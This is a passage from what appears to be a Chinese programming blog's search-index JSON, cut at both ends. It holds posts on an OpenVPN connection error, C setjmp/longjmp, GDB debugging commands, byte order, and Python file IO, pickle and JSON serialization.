112.229.125.230:54212 SIGUSR1[soft,connection-reset] received, client-instance restarting 链接被重置: ​ 未解决 切换协议为Udp是没问题; Tcp链接协议被重置; Ubuntu Authenticate/Decrypt packet error: cipher final failed 12配置文件中添加：cipher AES-256-CBC ## Ubuntu 默认编码不未AES-256-CBC ​","categories":[],"tags":[{"name":"Centos","slug":"Centos","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Centos/"}]},{"title":"Linux setjmp & longjmp","slug":"cpluscplus/Linux-setjmp-longjmp","date":"2018-02-27T12:51:08.000Z","updated":"2018-09-29T13:13:01.439Z","comments":true,"path":"2018/02/27/cpluscplus/Linux-setjmp-longjmp/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/02/27/cpluscplus/Linux-setjmp-longjmp/","excerpt":"错误处理是任何语言都需要解决的问题，任何语言都不能保证100%的正确运行，都需要异常机制的存在，例如c++ 的try ... catch , c 语言因此提供 setjmp 与 longjmp 来实现 内存堆栈的跳转。 实现一种非本地局部跳转的机制, 本地局部跳转如:goto","text":"错误处理是任何语言都需要解决的问题，任何语言都不能保证100%的正确运行，都需要异常机制的存在，例如c++ 的try ... catch , c 语言因此提供 setjmp 与 longjmp 来实现 内存堆栈的跳转。 实现一种非本地局部跳转的机制, 本地局部跳转如:goto 函数定义12int setjmp(jmp_buf jb);void longjmp(jmp_buf jb, int r); setjmp 用于保存程序的运行时堆栈环境 cs:ip 寄存器; longjmp 恢复先前程序中调用setjmp 函数所保存的堆栈环境; 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152[Postgres@yfslcentos71 code]$ cat jmp.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;setjmp.h&gt;jmp_buf jb;void f1()&#123; printf(&quot;进入f1()\\n&quot;); //if(0/*正确执行*/)&#123; &#125; if(1/*正确执行*/)&#123; printf(&quot;F1 正确执行\\n&quot;); &#125; else &#123; printf(&quot;F1 执行错误\\n&quot;); longjmp(jb,1); &#125; printf(&quot;退出f1()\\n&quot;);&#125;void f2()&#123; printf(&quot;进入f2()\\n&quot;); if(0/*正确执行*/) &#123; printf(&quot;F2 正确执行\\n&quot;); &#125; else &#123; printf(&quot;F2 执行错误\\n&quot;); longjmp(jb, 2); &#125; printf(&quot;退出f2()\\n&quot;);&#125;int main()&#123; int r = setjmp(jb); printf(&quot;longjmp 返回值 r = %d\\n&quot;, r); if(r==0)&#123; f1(); f2(); &#125;else if(r==1)&#123; printf(&quot;else if 1 返回值 r = %d\\n&quot;, r); printf(&quot;处理错误1\\n&quot;); exit(1); &#125;else if(r==2)&#123; printf(&quot;else if 2 返回值 r = %d\\n&quot;, r); printf(&quot;处理错误2\\n&quot;); exit(2); &#125; printf(&quot;所有函数执行完毕, 程序结束\\n&quot;); return 0;&#125; 输出结果 12345678910[Postgres@yfslcentos71 code]$ ./jmp longjmp 返回值 r = 0 &lt;==&gt; 初始执行 返回值 为 0;进入f1()F1 正确执行退出f1()进入f2() F2 执行错误 &lt;==&gt; longjmp 跳转;longjmp 返回值 r = 2 &lt;==&gt; 重新返回 setjmp 处，其r值即为longjmp的第二参数;else if 2 返回值 r = 2 &lt;==&gt; 执行 else if 语句处理错误2","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"},{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"GDB 调试","slug":"rebuild/GDB-调试","date":"2018-02-20T12:53:52.000Z","updated":"2018-11-20T10:56:34.403Z","comments":true,"path":"2018/02/20/rebuild/GDB-调试/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/02/20/rebuild/GDB-调试/","excerpt":"GDB 调试篇运行命令 run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。 continue （简写c ）：继续执行，到下一个断点处（或运行结束） next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。 step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。 until+行号： 运行至某行，不仅仅用来跳出循环 finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。 call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55) quit：简记为 q ，退出gdb","text":"GDB 调试篇运行命令 run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。 continue （简写c ）：继续执行，到下一个断点处（或运行结束） next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。 step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。 until+行号： 运行至某行，不仅仅用来跳出循环 finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。 call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55) quit：简记为 q ，退出gdb 设置断点 break n （简写b n）:在第n行处设置断点 （可以带上代码路径和代码名称： b OAGUPDATE.cpp:578） b fn1 if a＞b：条件断点设置 break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button delete 断点号n：删除第n个断点 disable 断点号n：暂停第n个断点 enable 断点号n：开启第n个断点 clear 行号n：清除第n行的断点 info b （info breakpoints） ：显示当前程序的断点设置情况 delete breakpoints：清除所有断点： 查看源代码 list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。 list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12 list 函数名：将显示“函数名”所在函数的源代码，如：list main list ：不带参数，将接着上一次 list 命令的，输出下边的内容。 打印表达式 print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。 print a：将显示整数 a 的值 print ++a：将把 a 中的值加1,并显示出来 print name：将显示字符串 name 的值 print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数 print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数 display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a whatis ：查询变量或函数 info function： 查询函数 扩展info locals： 显示当前堆栈页的所有变量 查询运行信息 where/bt ：当前运行的堆栈列表； bt backtrace 显示当前调用堆栈 up/down 改变堆栈显示的深度 set args 参数:指定运行时的参数 show args：查看设置好的参数 info program： 来查看程序的是否在运行，进程号，被暂停的原因。 调试调试问题 字符串显示不全 (gdb) p recvbuf ​ $1 = 0x7ffff2692eb0 “{\\n \\”errcode\\”: 0,\\n \\”errlevel\\”: 68,\\n \\”errmsg\\”: \\”i`m ip:192.168.2.253\\”,\\n \\”filename\\”: \\”main.cpp\\”,\\n \\”happenddata\\”: \\”(2017-08-18 15:36:49 周五)\\”,\\n \\”isbehave\\”: 0,\\n \\”ishardware\\”: 0,\\n “… GDB 默认显示 200 的字符长度; (gdb) show print elements Limit on string chars or array elements to print is 200. 使用set print elements [] 调整参数 set print elements 0 调整 set print elements 300 GDB 调试程序,找不到源码,list无效 12show directories ## 查看当前GDB寻找源码路径dir dirname ## 添加一个新的源代码查找路径; 多个用 : 分开 ​ 查看源代码信息: 文件名, 路径, Source language等 1info source 查看当前栈 bt (backtrace)/ f (frame) f: 打印栈的层编号, 当前函数名， 函数参数值, 所在文件, 行号, 执行语句等 up: 表示向栈的上面移动n层, 默认 1 down: 标识向栈的下面移动n层, 默认 1 info args 打印当前函数的参数名以及值 info locals 打印当前函数中所有局部变量以及值 info catch 打印当前的函数中异常处理信息 list : list + 显示往后代码 list - 显示之前代码 set listsize 设置一次显示源代码行数 show listsize 显示当前listsize 设置 搜索源代码 : 可以使用正则表达式 forward-search / search 向前搜索 reverse-search 全部搜索 输出格式: x 按十六进制格式显示变量 d 按十进制格式显示变量 u 按十六进制格式显示无符号整型 o 按八进制格式显示变量 t 按二进制格式显示变量 a 按十六进制格式显示变量 c 按字符格式显示变量 f 按浮点数格式显示变量 1234(gdb) p i$21 = 101(gdb) p/a i$22 = 0x65 查看结构体类型 ptype123456(gdb) ptype Listtype = struct List &#123; NodeTag type; int length; ListCell *head; ListCell *tail; 改变程序执行print x=4 whatis width // 查看数据类型 set width=47 // 修改值; jump 跳转执行 jump 提供乱序执行的功能。 GDB可以修改程序的执行顺序,让程序执行随意的跳转; jump 指定下一条语句的运行点， 可以是文件的行号， 可以使file:line 格式， 可以使+num 偏移量格式,表示着下一条运行语句从哪开始 jump 代码行的运行地址: ​ jump 命令不会改变当前程序栈的内容，所以，当你从一个函数跳到另一个函数时，函数运行完返回时进行弹栈操作时必然会发生错误，可能结果非常奇怪， 甚至产生Core dump文件， 所以最好在同一个函数中跳转; jump 修改寄存器地址, set $pc 1set $pc = 0x485 产生信号量使用signal命令，可以产生一个信号量给被调试的程序。如: 中断信号Ctrl + C , 这非常方便程序的调试， 可以在程序运行的任意位置设置断点，并在该断点用GDB产生一个信号量，精确在某处产生信号非常有利于调试。 语法： signal, Unix 的系统信号量通常从1到15，所以取值也在这个范围。 signal 命令和shell的kill不同，系统的kill命令发送信号给被调试程序时，是有GDB截获，而signal命令所发出一信号则是直接发给被调试程序的。 强制函数返回如果你的调试断点在某个函数中，并还有语句没有执行完， 你可以使用return命令强制函数忽略还没有执行的语句并返回。 return 使用return命令取消当前函数的执行，并立即返回，如果指定了，那么该表达式的值会被认作函数的返回值 设置临时变量 set var示例 123456789101112131415#include &lt;stdio.h&gt;int func(void)&#123; int i = 2; return i;&#125;int main(void)&#123; int a = 0; a = func(); printf(\"%d\\n\", a); return 0;&#125; 技巧 在gdb中，可以用“set var variable=expr”命令设置变量的值，以上面代码为例： 1234567Breakpoint 2, func () at a.c:55 int i = 2;(gdb) n7 return i;(gdb) set var i = 8(gdb) p i$4 = 8 可以看到在func函数里用set命令把i的值修改成为8。 也可以用“set {type}address=expr”的方式，含义是给存储地址在address，变量类型为type的变量赋值，仍以上面代码为例： 123456789Breakpoint 2, func () at a.c:55 int i = 2;(gdb) n7 return i;(gdb) p &amp;i$5 = (int *) 0x8047a54(gdb) set &#123;int&#125;0x8047a54 = 8(gdb) p i$6 = 8 可以看到i的值被修改成为8。 另外寄存器也可以作为变量，因此同样可以修改寄存器的值: 1234567891011121314Breakpoint 2, func () at a.c:55 int i = 2;(gdb)(gdb) n7 return i;(gdb)8 &#125;(gdb) set var $eax = 8 ;; 修改寄存器地址;(gdb) nmain () at a.c:1515 printf(\"%d\\n\", a);(gdb)816 return 0; 可以看到因为eax寄存器存储着函数的返回值，所以当把eax寄存器的值改为8后，函数的返回值也变成了8。 强制调用函数call 表达式中可以是函数， 以此达到强制调用函数的目的， 并显示函数的返回值，如果函数返回值是void，那么就不显示。 另一个相似的命令也可以完成这一功能 -- print， print 后边可以跟表达式，所以也可以用它来调用函数， print 和 call 的不同是， 如果函数返回void, call 则不显示， print则显示函数的返回值，并把该值存入历史数据中. GDB 调试子进程 follow-fork-mode follow-fork-mode 用法: 1set follow-fork-mode [parent|child] parent: fork之后继续调试父进程，子进程不受影响。 child: fork之后调试子进程，父进程不受影响。 因此如果需要调试子进程，在启动gdb后：(gdb) set follow-fork-mode child 示例 GDB 同时调试父子进程 detach-on-fork参数，指示GDB在fork之后是否断开（detach）某个进程的调试，或者都交由GDB控制： set detach-on-fork [on|off] on: 断开调试follow-fork-mode指定的进程。GDB 默认参数 off: gdb将控制父进程和子进程。follow-fork-mode指定的进程将被调试，另一个进程置于暂停（suspended）状态。 注意，最好使用GDB 6.6或以上版本，如果你使用的是GDB6.4，就只有follow-fork-mode模式。 命令与参数查看结构体类型 ptype123456(gdb) ptype Listtype = struct List &#123; NodeTag type; int length; ListCell *head; ListCell *tail; 调试宏定义 -g[level]12345678Request debugging information and also use level to specify how much information. The default level is 2.Level 0 produces no debug information at all. Thus, -g0 negates -g.Level 1 produces minimal information, enough for making backtraces in parts of the program that you don't plan to debug. This includes descriptions offunctions and external variables, but no information about local variables and no line numbers.Level 3 includes extra information, such as all the macro definitions present in the program. Some debuggers support macro expansion when you use -g3.-gdwarf-2 does not accept a concatenated debug level, because GCC used to support an option -gdwarf that meant to generate debug information in version1 of the DWARF format (which is very different from version 2), and it would have been too confusing. That debug format is long obsolete, but theoption cannot be changed now. Instead use an additional -glevel option to change the debug level for DWARF. 配置文件 ~/.gdbinit123456789101112131415161718set startup-with-shell offset listsize 30#缩进 显示结构体成员set print pretty on#保存历史命令set history filename ~/.gdb_historyset history save on#gdb 过程记录#set logging file log.txtset logging on#是否让输出覆盖之前的日志文件#set logging overwrite on","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"调试","slug":"调试","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/调试/"},{"name":"GDB","slug":"GDB","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/GDB/"}]},{"title":"理解字节序","slug":"cpluscplus/理解字节序","date":"2018-01-31T12:55:53.000Z","updated":"2018-01-31T12:58:00.393Z","comments":true,"path":"2018/01/31/cpluscplus/理解字节序/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/31/cpluscplus/理解字节序/","excerpt":"端的起源 测试","text":"端的起源 测试 端的起源 ​ Lilliput和Blefuscu这两大强国在过去36个月里一直在苦战。战争开始是由于以下的原因：我们大家都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端，可是当今皇帝的祖父小时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了。因此他的父亲，当时的皇帝，就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。老百姓们对这项命令极其反感。历史告诉我们，由此曾经发生过6次叛乱，其中一个皇帝送了命，另一个丢了王位。这些叛乱大多都是由Blefuscu的国王大臣们煽动起来的。叛乱平息后，流亡的人总是逃到那个帝国去寻求避难。据估计，先后几次有11000人情愿受死也不肯去打破鸡蛋较小的一端。关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的，法律也规定该派任何人不得做官。” 字节顺序，又称端序或尾序（英语：Endianness）。在计算机科学领域中，是跨越多字节的程序对象的存储规则。 12大端字节序：高位字节在前，低位字节在后； 高字节数据存放于内存低地址处。小端字节序：低位字节在前，高位字节在后； 低字节数据存放在内存低地址处。 因此0x01020304 在按照大端小端排序写法如下: ​ 低地址 ——-&gt; 高地址 大端: ​ 0x01 0x02 0x03 0x04 小端: ​ 0x04 0x03 0x02 0x01 为什么有字节序?计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始， 因此计算机内部处理使小端字节序。 但是人类习惯读写大端字节序，除了计算机内部处理， 其他场合都是大端字节序，比如网络传输，文件存储。 测试用例123456789101112131415161718# include &lt;stdio.h&gt;int main(void)&#123; union ion&#123; int a; char b[4]; &#125;pos; pos.a = 0x01020304; if(pos.b[0] == 0x01) printf(\"大端\\n\"); else printf(\"小端\\n\"); return 0;&#125;","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"Python-IO编程","slug":"gram/Python-IO编程","date":"2018-01-27T15:16:39.000Z","updated":"2018-11-19T16:12:39.605Z","comments":true,"path":"2018/01/27/gram/Python-IO编程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/27/gram/Python-IO编程/","excerpt":"读文件 二进制文件 字符编码 写文件 Json StringIO BytesIO 序列化","text":"读文件 二进制文件 字符编码 写文件 Json StringIO BytesIO 序列化 读文件1&gt;&gt;&gt; f = open(&apos;/Users/michael/test.txt&apos;, &apos;r&apos;) 由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try ... finally来实现： 123456try: f = open(&apos;/path/to/file&apos;, &apos;r&apos;) print(f.read())finally: if f: f.close() 但是每次都这么写实在太繁琐，所以，Python引入了with语句来自动帮我们调用close()方法： 12with open(&apos;/path/to/file&apos;, &apos;r&apos;) as f: print(f.read()) 这和前面的try ... finally是一样的，但是代码更佳简洁，并且不必调用f.close()方法。 二进制文件前面讲的默认都是读取文本文件，并且是UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用&#39;rb&#39;模式打开文件即可： 123&gt;&gt;&gt; f = open(&apos;/Users/michael/test.jpg&apos;, &apos;rb&apos;)&gt;&gt;&gt; f.read()b&apos;\\xff\\xd8\\xff\\xe1\\x00\\x18Exif\\x00\\x00...&apos; # 十六进制表示的字节 字符编码要读取非UTF-8编码的文本文件，需要给open()函数传入encoding参数，例如，读取GBK编码的文件： 123&gt;&gt;&gt; f = open(&apos;/Users/michael/gbk.txt&apos;, &apos;r&apos;, encoding=&apos;gbk&apos;)&gt;&gt;&gt; f.read()&apos;测试&apos; 遇到有些编码不规范的文件，你可能会遇到UnicodeDecodeError，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，open()函数还接收一个errors参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略： 1&gt;&gt;&gt; f = open(&apos;/Users/michael/gbk.txt&apos;, &apos;r&apos;, encoding=&apos;gbk&apos;, errors=&apos;ignore&apos;) 写文件写文件和读文件是一样的，唯一区别是调用open()函数时，传入标识符&#39;w&#39;或者&#39;wb&#39;表示写文本文件或写二进制文件： 123&gt;&gt;&gt; f = open(&apos;/Users/michael/test.txt&apos;, &apos;w&apos;)&gt;&gt;&gt; f.write(&apos;Hello, world!&apos;)&gt;&gt;&gt; f.close() 你可以反复调用write()来写入文件，但是务必要调用f.close()来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用close()方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用close()的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用with语句来得保险： 12with open(&apos;/Users/michael/test.txt&apos;, &apos;w&apos;) as f: f.write(&apos;Hello, world!&apos;) 要写入特定编码的文本文件，请给open()函数传入encoding参数，将字符串自动转换成指定编码。 StringIO很多时间, 数据读写不一定是文件，也可能在内存中读写。 StringIO 顾名思义就是在内存中读写string 要把str 写成StringIO， 我们需要创建一个StringIO， 然后像文件医院写入即可。 12345678910&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO()&gt;&gt;&gt; f.write(&apos;hello&apos;)5&gt;&gt;&gt; f.write(&apos; &apos;)1&gt;&gt;&gt; f.write(&apos;world!&apos;)6&gt;&gt;&gt; print(f.getvalue())hello world! getvalue()方法用于获得写入后的str。 要读取StringIO，可以用一个str初始化StringIO，然后，像读文件一样读取： 1234567891011&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO(&apos;Hello!\\nHi!\\nGoodbye!&apos;)&gt;&gt;&gt; while True:... s = f.readline()... if s == &apos;&apos;:... break... print(s.strip())...Hello!Hi!Goodbye! BytesIOStringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。 BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes： 123456&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO()&gt;&gt;&gt; f.write(&apos;中文&apos;.encode(&apos;utf-8&apos;))6&gt;&gt;&gt; print(f.getvalue())b&apos;\\xe4\\xb8\\xad\\xe6\\x96\\x87&apos; 请注意，写入的不是str，而是经过UTF-8编码的bytes。 unicode 和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取： 1234&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO(b&apos;\\xe4\\xb8\\xad\\xe6\\x96\\x87&apos;) ## &quot;中文&quot;.encode(utf-8) &gt;&gt;&gt; f.read()b&apos;\\xe4\\xb8\\xad\\xe6\\x96\\x87&apos; 操作文件 和 目录 help(os)操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用： 12345678910# 查看当前目录的绝对路径:&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)&apos;/Users/michael&apos;# 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:&gt;&gt;&gt; os.path.join(&apos;/Users/michael&apos;, &apos;testdir&apos;)&apos;/Users/michael/testdir&apos;# 然后创建一个目录:&gt;&gt;&gt; os.mkdir(&apos;/Users/michael/testdir&apos;)# 删掉一个目录:&gt;&gt;&gt; os.rmdir(&apos;/Users/michael/testdir&apos;) 把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串： 1part-1/part-2 而Windows下会返回这样的字符串： 1part-1\\part-2 同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名： 12&gt;&gt;&gt; os.path.split(&apos;/Users/michael/testdir/file.txt&apos;)(&apos;/Users/michael/testdir&apos;, &apos;file.txt&apos;) os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便： 12&gt;&gt;&gt; os.path.splitext(&apos;/path/to/file.txt&apos;)(&apos;/path/to/file&apos;, &apos;.txt&apos;) 这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。 文件操作使用下面的函数。假定当前目录下有一个test.txt文件： 1234# 对文件重命名:&gt;&gt;&gt; os.rename(&apos;test.txt&apos;, &apos;test.py&apos;)# 删掉文件:&gt;&gt;&gt; os.remove(&apos;test.py&apos;) 但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。 幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是os模块的补充。 最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码： 12&gt;&gt;&gt; [x for x in os.listdir(&apos;.&apos;) if os.path.isdir(x)][&apos;.lein&apos;, &apos;.local&apos;, &apos;.m2&apos;, &apos;.npm&apos;, &apos;.ssh&apos;, &apos;.Trash&apos;, &apos;.vim&apos;, &apos;Applications&apos;, &apos;Desktop&apos;, ...] 要列出所有的.py文件，也只需一行代码： 12&gt;&gt;&gt; [x for x in os.listdir(&apos;.&apos;) if os.path.isfile(x) and os.path.splitext(x)[1]==&apos;.py&apos;][&apos;apis.py&apos;, &apos;config.py&apos;, &apos;models.py&apos;, &apos;pymonitor.py&apos;, &apos;test_db.py&apos;, &apos;urls.py&apos;, &apos;wsgiapp.py&apos;] 序列化在程序运行的过程中，所有的变量都是在内存中，比如，定义一个dict： 1d = dict(name=&apos;Bob&apos;, age=20, score=88) 可以随时修改变量，比如把name改成&#39;Bill&#39;，但是一旦程序结束，变量所占用的内存就被操作系统全部回收。如果没有把修改后的&#39;Bill&#39;存储到磁盘上，下次重新运行程序，变量又被初始化为&#39;Bob&#39;。 我们把变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling。 序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。 反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling。 我们尝试把一个对象序列化并写入文件： 1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; d = dict(name=&apos;Bob&apos;, age=20, score=88)&gt;&gt;&gt; pickle.dumps(d)b&apos;\\x80\\x03&#125;q\\x00(X\\x03\\x00\\x00\\x00ageq\\x01K\\x14X\\x05\\x00\\x00\\x00scoreq\\x02KXX\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00Bobq\\x04u.&apos; pickle.dumps()方法把任意对象序列化成一个bytes，然后，就可以把这个bytes写入文件。或者用另一个方法pickle.dump()直接把对象序列化后写入一个file-like Object： 123&gt;&gt;&gt; f = open(&apos;dump.txt&apos;, &apos;wb&apos;)&gt;&gt;&gt; pickle.dump(d, f) ## dump 序列化成为一个bytes&gt;&gt;&gt; f.close() 看看写入的dump.txt文件，一堆乱七八糟的内容，这些都是Python保存的对象内部信息。 当我们要把对象从磁盘读到内存时，可以先把内容读到一个bytes，然后用pickle.loads()方法反序列化出对象，也可以直接用pickle.load()方法从一个file-like Object中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象： 12345&gt;&gt;&gt; f = open(&apos;dump.txt&apos;, &apos;rb&apos;)&gt;&gt;&gt; d = pickle.load(f)&gt;&gt;&gt; f.close()&gt;&gt;&gt; d&#123;&apos;age&apos;: 20, &apos;score&apos;: 88, &apos;name&apos;: &apos;Bob&apos;&#125; 变量的内容又回来了！ Json 文本​ 我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。 JSON表示的对象就是标准的JavaScript语言的对象，JSON和Python内置的数据类型对应如下： JSON类型 Python类型 {} dict [] list “string” str 1234.56 int或float true/false True/False null None Python内置的json模块提供了非常完善的Python对象到JSON格式的转换。我们先看看如何把Python对象变成一个JSON： 1234&gt;&gt;&gt; import json&gt;&gt;&gt; d = dict(name=&apos;Bob&apos;, age=20, score=88) ## 本身是一个字典;&gt;&gt;&gt; json.dumps(d)&apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos; dumps()方法返回一个str，内容就是标准的JSON。类似的，dump()方法可以直接把JSON写入一个file-like Object。 要把JSON反序列化为Python对象，用loads()或者对应的load()方法，前者把JSON的字符串反序列化，后者从file-like Object中读取字符串并反序列化： 123&gt;&gt;&gt; json_str = &apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos;&gt;&gt;&gt; json.loads(json_str)&#123;&apos;age&apos;: 20, &apos;score&apos;: 88, &apos;name&apos;: &apos;Bob&apos;&#125; 由于JSON标准规定JSON编码是UTF-8，所以我们总是能正确地在Python的str与JSON的字符串之间转换。 Json 与 class类 (忽略)Python的dict对象可以直接序列化为JSON的{}，不过，很多时候，我们更喜欢用class表示对象，比如定义Student类，然后序列化： 12345678910import jsonclass Student(object): def __init__(self, name, age, score): self.name = name self.age = age self.score = scores = Student(&apos;Bob&apos;, 20, 88)print(json.dumps(s)) 运行代码，毫不留情地得到一个TypeError： 123Traceback (most recent call last): ...TypeError: &lt;__main__.Student object at 0x10603cc50&gt; is not JSON serializable 错误的原因是Student对象不是一个可序列化为JSON的对象。 如果连class的实例对象都无法序列化为JSON，这肯定不合理！ 别急，我们仔细看看dumps()方法的参数列表，可以发现，除了第一个必须的obj参数外，dumps()方法还提供了一大堆的可选参数： https://docs.python.org/3/library/json.html#json.dumps 这些可选参数就是让我们来定制JSON序列化。前面的代码之所以无法把Student类实例序列化为JSON，是因为默认情况下，dumps()方法不知道如何将Student实例变为一个JSON的{}对象。 可选参数default就是把任意一个对象变成一个可序列为JSON的对象，我们只需要为Student专门写一个转换函数，再把函数传进去即可： 123456def student2dict(std): return &#123; &apos;name&apos;: std.name, &apos;age&apos;: std.age, &apos;score&apos;: std.score &#125; 这样，Student实例首先被student2dict()函数转换成dict，然后再被顺利序列化为JSON： 12&gt;&gt;&gt; print(json.dumps(s, default=student2dict)) ##添加默认转换函数&#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125; 不过，下次如果遇到一个Teacher类的实例，照样无法序列化为JSON。我们可以偷个懒，把任意class的实例变为dict： 1print(json.dumps(s, default=lambda obj: obj.__dict__)) 因为通常class的实例都有一个__dict__属性，它就是一个dict，用来存储实例变量。也有少数例外，比如定义了__slots__的class。 同样的道理，如果我们要把JSON反序列化为一个Student对象实例，loads()方法首先转换出一个dict对象，然后，我们传入的object_hook函数负责把dict转换为Student实例： 12def dict2student(d): return Student(d[&apos;name&apos;], d[&apos;age&apos;], d[&apos;score&apos;]) ## 实例化之后为本身类实例; 运行结果如下： 123&gt;&gt;&gt; json_str = &apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos;&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))&lt;__main__.Student object at 0x10cd3c190&gt; 打印出的是反序列化的Student实例对象。","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"Python-错误、调试","slug":"gram/Python-错误、调试","date":"2018-01-25T15:12:42.000Z","updated":"2018-11-19T16:12:50.765Z","comments":true,"path":"2018/01/25/gram/Python-错误、调试/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/25/gram/Python-错误、调试/","excerpt":"try raise 断言","text":"try raise 断言 try让我们用一个例子来看看try的机制： 123456789try: print(&apos;try...&apos;) r = 10 / 0 print(&apos;result:&apos;, r)except ZeroDivisionError as e: print(&apos;except:&apos;, e)finally: print(&apos;finally...&apos;)print(&apos;END&apos;) 